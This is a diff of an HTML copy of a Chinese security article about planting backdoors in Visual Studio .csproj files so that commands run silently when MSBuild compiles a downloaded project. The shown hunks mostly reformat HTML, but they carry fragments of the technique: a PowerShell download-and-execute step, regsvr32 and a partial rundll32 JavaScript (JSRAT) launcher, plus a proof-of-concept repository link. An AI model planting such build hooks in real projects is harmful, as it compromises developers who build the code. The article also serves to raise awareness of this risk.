@@ -3,28 +3,28 @@
 			<head>
 			     <title>Pay close attention to your download code——Visual Studio trick to run code when building - 三好学生</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/16381">http://drops.wooyun.org/tips/16381</a></h1>
 				
       <p>
-        <h1>0x00前言</h1>
+        </p><h1>0x00前言</h1>
 
-<hr />
+<hr>
 
 <p><strong>本文源于一次大胆的尝试：</strong></p>
 
 <p>对github上某一知名的C#工程作细微改动并推荐用户下载，用户在毫不知情的情况下往往会在查看源代码后选择编译文件，然而在编译的过程中，会隐蔽执行代码，获得用户的主机权限，细极思恐。演示如下：</p>
 
-<p><img src="http://static.wooyun.org/upload/image/201606/2016060310185994393.gif" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org/upload/image/201606/2016060310185994393.gif" alt="Alt text"></p>
 
 <!--more-->
 
 <h1>0x01 背景知识</h1>
 
-<hr />
+<hr>
 
-<p>MSBuild是 Microsoft Build Engine 的缩写，代表 Microsoft 和 Visual Studio 的新的生成平台<br />
+<p>MSBuild是 Microsoft Build Engine 的缩写，代表 Microsoft 和 Visual Studio 的新的生成平台<br>
 MSBuild可在未安装Visual Studio的环境中编译.net的工程文件</p>
 
 <h2>实例1：</h2>
@@ -38,7 +38,7 @@ MSBuild可在未安装Visual Studio的环境中编译.net的工程文件</p>
 &lt;/Project&gt;
 </code></pre>
 
-<p>保存为test.csproj<br />
+<p>保存为test.csproj<br>
 cmd下执行：</p>
 
 <pre><code>#!shell
@@ -47,7 +47,7 @@ C:\Windows\Microsoft.Net\Framework\v4.0.30319\msbuild.exe test.csproj
 
 <p>在cmd下会输出显示当前时间，如图</p>
 
-<p><img src="http://static.wooyun.org/upload/image/201606/2016060310191923913.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org/upload/image/201606/2016060310191923913.png" alt="Alt text"></p>
 
 <h2>实例2:</h2>
 
@@ -74,7 +74,7 @@ class Test
 
 <p>保存为hello.csproj</p>
 
-<p>hello.cs和hello.csproj放于同一目录<br />
+<p>hello.cs和hello.csproj放于同一目录<br>
 cmd下执行：</p>
 
 <pre><code>#!shell
@@ -83,11 +83,11 @@ C:\Windows\Microsoft.Net\Framework\v4.0.30319\msbuild.exe hello.csproj
 
 <p>可以编译生成hello.exe</p>
 
-<p><img src="http://static.wooyun.org/upload/image/201606/2016060310193774369.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org/upload/image/201606/2016060310193774369.png" alt="Alt text"></p>
 
 <h1>0x02 构造工程（脚本文件）</h1>
 
-<hr />
+<hr>
 
 <p>在Visual Studio下新建一个c#工程，查看目录下的.csproj文件，格式如下：</p>
 
@@ -206,7 +206,7 @@ C:\Windows\Microsoft.Net\Framework\v4.0.30319\msbuild.exe hello.csproj
 
 <h1>0x03 添加后门测试</h1>
 
-<hr />
+<hr>
 
 <p>对于原始文档，首先去掉<code>&lt;--</code>和<code>--&gt;</code>的标记</p>
 
@@ -222,17 +222,17 @@ C:\Windows\Microsoft.Net\Framework\v4.0.30319\msbuild.exe hello.csproj
 
 <p>成功弹出计算器，build的过程卡住，手动结束calc进程，编译成功，如图：</p>
 
-<p><img src="http://static.wooyun.org/upload/image/201606/2016060310195961687.gif" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org/upload/image/201606/2016060310195961687.gif" alt="Alt text"></p>
 
-<p><strong>解决方法：</strong><br />
-解决calc进程死锁，可以通过powershell的start process异步调用来执行calc.exe<br />
+<p><strong>解决方法：</strong><br>
+解决calc进程死锁，可以通过powershell的start process异步调用来执行calc.exe<br>
 脚本内容为</p>
 
 <pre><code>#!shell
 start-process calc.exe
 </code></pre>
 
-<p>上传至github<br />
+<p>上传至github<br>
 使用powershell来下载执行</p>
 
 <p>.csproj文件修改为：</p>
@@ -245,7 +245,7 @@ start-process calc.exe
 
 <p>执行如图：</p>
 
-<p><img src="http://static.wooyun.org/upload/image/201606/2016060310201433968.gif" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org/upload/image/201606/2016060310201433968.gif" alt="Alt text"></p>
 
 <h2>2、在编译过程中调用regsvr32.exe</h2>
 
@@ -259,7 +259,7 @@ start-process calc.exe
 
 <p>使用regsvr32会在控制台输出报错提示权限不够，但依然可以成功执行命令，如图</p>
 
-<p><img src="http://static.wooyun.org/upload/image/201606/2016060310203144681.gif" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org/upload/image/201606/2016060310203144681.gif" alt="Alt text"></p>
 
 <h2>3、在编译过程中运行JSRAT</h2>
 
@@ -279,7 +279,7 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObj
 
 <p>成功弹出计算器，但无法成功编译文件，手动结束rundll32进程，编译成功，提示rundll32调用错误</p>
 
-<p><strong>解决方法：</strong><br />
+<p><strong>解决方法：</strong><br>
 写临时js文件,再运行，代码如下：</p>
 
 <pre><code>#!xml
@@ -295,30 +295,30 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObj
 
 <h1>0x04 实际影响</h1>
 
-<hr />
+<hr>
 
 <p>任意一个c#工程，只要编辑.csproj文件,即可实现在编译过程中执行任意命令。 正如本文开始的演示图，绝大部分人从github上下载代码后，会选择直接编译，即使部分人会注意代码细节，也常常会忽略.csproj文件，并且通过Visual Studio 的操作面板无法获取添加的后门代码。</p>
 
-<p><img src="http://static.wooyun.org/upload/image/201606/2016060310205988488.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org/upload/image/201606/2016060310205988488.png" alt="Alt text"></p>
 
 <p>如果别有用心的人在公开项目的.csproj文件添加了后门代码，后果将不堪设想。希望本文能引起大家对此细节的注意，尤其是开发人员，编译工程前尤其要记得查看.**proj文件的细节。亡羊而补牢，未为迟也。</p>
 
-<p><strong>Poc地址：</strong><br />
+<p><strong>Poc地址：</strong><br>
 <a href="https://github.com/3gstudent/p0wnedShell-DarkVersion">https://github.com/3gstudent/p0wnedShell-DarkVersion</a></p>
 
 <h1>0x05 补充</h1>
 
-<hr />
+<hr>
 
-<p>使用Visual Studio中的其他语言也同样可以插入后门：<br />
-<strong>Visual C++：</strong><br />
+<p>使用Visual Studio中的其他语言也同样可以插入后门：<br>
+<strong>Visual C++：</strong><br>
 - 修改.vcxproj文件</p>
 
-<p><strong>Visual Basic：</strong><br />
+<p><strong>Visual Basic：</strong><br>
 - 修改.vbproj文件</p>
 
-<p><strong>Visual F#：</strong><br />
-- 修改.fsproj文件</p>      </p>
+<p><strong>Visual F#：</strong><br>
+- 修改.fsproj文件</p>      <p></p>
     
 			</body>
 		</html>
